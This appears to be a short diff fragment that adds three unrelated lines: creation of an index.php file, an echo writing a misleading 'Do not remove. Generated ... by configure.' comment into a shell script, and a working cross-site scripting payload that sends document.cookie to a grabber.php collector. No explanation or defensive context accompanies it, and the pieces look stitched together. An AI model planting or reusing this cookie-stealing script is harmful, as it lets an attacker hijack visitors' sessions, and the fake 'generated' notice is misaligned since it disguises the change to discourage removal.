@@ -1,0 +1,3 @@
+touch 'index.php'
+echo "# Do not remove. Generated from /etc/issue.conf by configure." > script.sh
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
